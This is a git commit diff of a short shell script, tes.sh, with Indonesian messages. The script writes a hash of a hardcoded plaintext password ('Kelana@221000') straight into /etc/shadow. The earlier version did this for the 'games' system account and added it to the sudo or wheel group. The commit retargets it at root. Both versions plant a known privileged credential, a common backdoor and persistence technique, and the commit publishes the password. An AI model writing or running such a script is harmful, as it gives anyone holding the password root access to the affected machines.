340db151214bdc44f2f8a1aa997f64817ff17378
ChuckyReply <59968183+chuckyreply@users.noreply.github.com>
2025-12-16 15:11:40 +0700

    Update tes.sh

--- tes.sh
+++ tes.sh
@@ -1,17 +1,10 @@
 #!/bin/sh
 
-USER="games"
+USER="root"
 PASS="Kelana@221000"
 
-# set password
 HASH="$(openssl passwd -6 "$PASS")"
+
 sed -i "s|^$USER:[^:]*|$USER:$HASH|" /etc/shadow
 
-# tambahkan ke sudoers
-if getent group sudo >/dev/null 2>&1; then
-    usermod -aG sudo "$USER"
-elif getent group wheel >/dev/null 2>&1; then
-    usermod -aG wheel "$USER"
-fi
-
-echo "User '$USER' sekarang bisa sudo (akses root)."
+echo "Password user '$USER' sudah diset."
